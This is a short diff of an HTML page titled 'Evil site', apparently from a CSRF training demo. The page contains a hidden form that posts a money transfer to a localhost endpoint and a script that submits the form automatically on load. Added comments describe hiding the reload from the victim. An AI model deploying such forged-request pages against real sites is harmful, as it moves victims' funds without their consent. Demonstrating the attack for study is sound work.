@@ -5,8 +5,6 @@
         <title> Evil site</title>
     </head>
     <body>
-        <p>I am a cool site with cat gifs</p>
-        <img src = 'giphy.gif' />
         <form method='POST' action='http://localhost:4000/transfer' style='display:none'>
             Send amount:
                 <input name='amount' value='100'/>
@@ -15,6 +13,8 @@
                 <input type='submit' value='Send' />
         </form>
         <script>
+            //since forms when submitted end up reloading the web-page as a default behaviour
+            //which cause the user to suspect and so we use an iframe to hide it
             document.forms[0].submit()
         </script>
     </body>
